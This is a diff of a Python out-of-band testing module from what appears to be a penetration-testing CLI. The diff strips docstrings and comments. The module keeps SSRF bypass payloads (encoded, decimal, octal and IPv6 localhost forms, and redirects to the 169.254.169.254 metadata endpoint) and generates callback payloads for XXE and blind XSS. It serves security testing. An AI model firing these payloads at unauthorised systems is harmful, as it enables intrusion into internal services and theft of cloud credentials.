@@ -1,21 +1,15 @@
-"""Out-of-band interaction manager."""
 
 from __future__ import annotations
 
 import hashlib
 import json
-import random
-import string
 import time
 import uuid
-from typing import Any
 from urllib.parse import urlparse
 
 import requests
 from requests.exceptions import RequestException
 
-
-# OOB Payload Templates
 
 OOB_PAYLOADS = {
     "ssrf": {
@@ -27,17 +21,11 @@ OOB_PAYLOADS = {
             "http://{callback}:443/ssrf",
         ],
         "bypass": [
-            # URL encoding
             "http://%73%73%72%66.{callback}",
-            # Decimal IP
             "http://0x7f000001/",
-            # DNS rebinding (use callback for confirmation)
             "http://ssrf.{callback}",
-            # Redirect chain
             "http://{callback}/redirect?url=http://169.254.169.254/latest/meta-data/",
-            # IPv6
             "http://[::1]/",
-            # URL with @
             "http://attacker@{callback}/",
         ],
         "cloud_metadata": [
@@ -84,14 +72,6 @@ OOB_PAYLOADS = {
 
 
 class OOBManager:
-    """
-    Manages out-of-band testing using interact.sh or custom callback servers.
-    
-    Provides:
-      - Unique callback URLs per test
-      - Payload generation for SSRF, XXE, XSS, etc.
-      - Interaction polling and correlation
-    """
 
     def __init__(
         self,
@@ -99,46 +79,21 @@ class OOBManager:
         custom_callback_url: str | None = None,
         timeout: int = 10,
     ) -> None:
-        """
-        Parameters
-        ----------
-        interactsh_server : str
-            interact.sh compatible server domain.
-        custom_callback_url : str, optional
-            Your own callback server URL (e.g., Burp Collaborator, ngrok).
-        timeout : int
-            HTTP request timeout.
-        """
         self.interactsh_server = interactsh_server
         self.custom_callback_url = custom_callback_url
         self.timeout = timeout
         self.session = requests.Session()
         self.session.headers["User-Agent"] = "Mozilla/5.0 (VAPT-CLI OOB)"
         
-        # Track payloads sent and their correlation IDs
         self._correlation_map: dict[str, dict] = {}
         self._interactions: list[dict] = []
         
-        # Generate a unique session ID
         self._session_id = uuid.uuid4().hex[:12]
         
-        # interactsh client state
         self._interactsh_token: str | None = None
         self._interactsh_registered = False
 
     def get_callback_url(self, label: str = "test") -> str:
-        """
-        Get a unique callback URL for a specific test.
-        
-        Parameters
-        ----------
-        label : str
-            Human-readable label for correlation (e.g., "ssrf-api-transfer").
-            
-        Returns
-        -------
-        str: Callback URL that will record any interaction.
-        """
         correlation_id = self._generate_correlation_id(label)
         
         if self.custom_callback_url:
@@ -156,7 +111,6 @@ class OOBManager:
         return callback
 
     def get_callback_domain(self, label: str = "test") -> str:
-        """Get just the domain (for DNS-based detection)."""
         correlation_id = self._generate_correlation_id(label)
         
         domain = f"{correlation_id}.{self.interactsh_server}"
@@ -171,20 +125,6 @@ class OOBManager:
         return domain
 
     def generate_payloads(self, vuln_type: str, label: str = "test") -> list[str]:
-        """
-        Generate OOB payloads for a specific vulnerability type.
-        
-        Parameters
-        ----------
-        vuln_type : str
-            One of: ssrf, xxe, xss_blind, rfi, email
-        label : str
-            Label for correlation tracking.
-            
-        Returns
-        -------
-        list[str]: Payloads with callback URLs embedded.
-        """
         callback = self.get_callback_url(f"{vuln_type}-{label}")
         
         payloads = []
@@ -214,21 +154,6 @@ class OOBManager:
         return payloads
 
     def poll_interactions(self, wait_seconds: int = 30) -> list[dict]:
-        """
-        Poll for OOB interactions.
-        
-        Waits for the specified duration, then checks if any callbacks
-        were triggered by the target server.
-        
-        Parameters
-        ----------
-        wait_seconds : int
-            How long to wait before polling. Blind vulns may take time.
-            
-        Returns
-        -------
-        list[dict]: Confirmed interactions with correlation data.
-        """
         if wait_seconds > 0:
             time.sleep(wait_seconds)
         
@@ -239,7 +164,6 @@ class OOBManager:
         else:
             interactions = self._poll_interactsh()
         
-        # Correlate interactions with payloads
         for interaction in interactions:
             correlation_id = self._extract_correlation_id(interaction)
             if correlation_id and correlation_id in self._correlation_map:
@@ -250,11 +174,6 @@ class OOBManager:
         return interactions
 
     def get_confirmed_findings(self) -> list[dict]:
-        """
-        Return findings that have been confirmed via OOB interactions.
-        
-        Each confirmed interaction proves the vulnerability is real.
-        """
         confirmed = []
         
         for corr_id, data in self._correlation_map.items():
@@ -274,13 +193,10 @@ class OOBManager:
         return confirmed
 
     def _generate_correlation_id(self, label: str) -> str:
-        """Generate a unique correlation ID for tracking."""
         raw = f"{self._session_id}-{label}-{time.time()}"
         return hashlib.md5(raw.encode()).hexdigest()[:16]
 
     def _extract_correlation_id(self, interaction: dict) -> str | None:
-        """Extract correlation ID from an interaction record."""
-        # Try to find our correlation ID in the interaction data
         raw = json.dumps(interaction)
         for corr_id in self._correlation_map:
             if corr_id in raw:
@@ -288,10 +204,8 @@ class OOBManager:
         return None
 
     def _poll_interactsh(self) -> list[dict]:
-        """Poll interact.sh compatible server for interactions."""
         interactions = []
         
-        # interact.sh API polling
         try:
             poll_url = f"https://{self.interactsh_server}/poll"
             if self._interactsh_token:
@@ -311,7 +225,6 @@ class OOBManager:
         except (RequestException, json.JSONDecodeError, ValueError):
             pass
         
-        # Fallback: DNS check for each correlation ID
         if not interactions:
             import socket
             for corr_id, data in self._correlation_map.items():
@@ -331,7 +244,6 @@ class OOBManager:
         return interactions
 
     def _poll_custom_server(self) -> list[dict]:
-        """Poll a custom callback server for interactions."""
         interactions = []
         
         try:
@@ -351,11 +263,6 @@ class OOBManager:
         return interactions
 
     def generate_ssrf_payloads(self, callback_label: str = "ssrf") -> dict[str, list[str]]:
-        """
-        Generate comprehensive SSRF payloads with OOB callbacks.
-        
-        Returns categorized payloads for different SSRF bypass techniques.
-        """
         callback = self.get_callback_url(callback_label)
         
         payloads = {
@@ -369,8 +276,8 @@ class OOBManager:
                 "http://127.0.0.1:443/",
                 "http://[::1]/",
                 "http://0x7f000001/",
-                "http://2130706433/",  # 127.0.0.1 as decimal
-                "http://0177.0.0.1/",  # Octal
+                "http://2130706433/",
+                "http://0177.0.0.1/",
                 "http://127.1/",
                 "http://127.0.1/",
             ],
@@ -393,7 +300,6 @@ class OOBManager:
         return payloads
 
     def register_interactsh(self) -> bool:
-        """Register with an interact.sh server for interaction tracking."""
         try:
             register_url = f"https://{self.interactsh_server}/register"
             resp = self.session.post(register_url, timeout=self.timeout, verify=False)
@@ -408,12 +314,10 @@ class OOBManager:
 
     @property
     def is_active(self) -> bool:
-        """Check if OOB manager has active correlation tracking."""
         return len(self._correlation_map) > 0
 
     @property
     def pending_count(self) -> int:
-        """Number of payloads awaiting interaction confirmation."""
         return sum(
             1 for data in self._correlation_map.values()
             if not data["interactions"]
@@ -421,7 +325,6 @@ class OOBManager:
 
     @property
     def confirmed_count(self) -> int:
-        """Number of confirmed OOB interactions."""
         return sum(
             1 for data in self._correlation_map.values()
             if data["interactions"]
